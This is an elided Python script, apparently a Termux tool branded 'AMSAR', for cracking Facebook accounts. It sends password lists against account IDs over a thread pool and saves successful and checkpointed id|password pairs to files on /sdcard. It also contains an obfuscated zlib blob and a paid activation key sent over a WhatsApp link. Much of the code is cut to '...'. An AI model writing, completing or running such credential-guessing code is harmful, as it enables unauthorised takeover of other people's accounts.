...
try:
	...
	sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')except:
...
def buy():
	...
	try:
		...
		try:
			...
			print(f" Name Tho Suna Hoga Amsaro Dada Of All Fb ")
			...
			input("[Press Enter To Send Key Amsar Admin]")

			os.system(f"termux-open-url https://wa.me/+923330659600?text={bumper}")
...
def main():
	...
	if menu_opt =='1':
		...
		os.system('xdg-open https://https://raw.githubusercontent.com/AmSaRafR3Di/oproval.txt/main/oproval.txt')
...
class crack_main():
	...
	def crackmail(self,id):
		...
		print(" [*] First Name Example Amsar,afridi")
	...
	def m1(self,iid,name,passlist):
		...
		try:
			...
			sys.stdout.write('\r[AMSAR] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
			...
			for pw in passlist:
				...
				if 'session_key' in po:
					...
					print(' \033[1;32m[AMSAR-OK] '+roid+' | '+pas+'\033[0;97m')

					open('/sdcard/amsar_ok.txt','a').write(roid+'|'+pas+'\n')
				...
				if 'User must verify their account' in po:
					...
					try:
						...
						print(' \033[1;31m[AMSAR-CP] '+roid+' | '+pas+'\033[0;97m')

						open('/sdcard/amsar_cp.txt','a').write(roid+'|'+pas+'\n')
...
def new_file(cookies,access_token):
	...
	with ThreadPool(max_workers=20) as yaari:
		...
		for exid in file:
			...
			yaari.submit(iamAmsar, exid,cookies,access_token,sf)

	try:

		son = f"amsar{str(random.randint(0,90))}.txt"

	except:

		son = f"amsar{str(random.randint(10,50))}.txt"
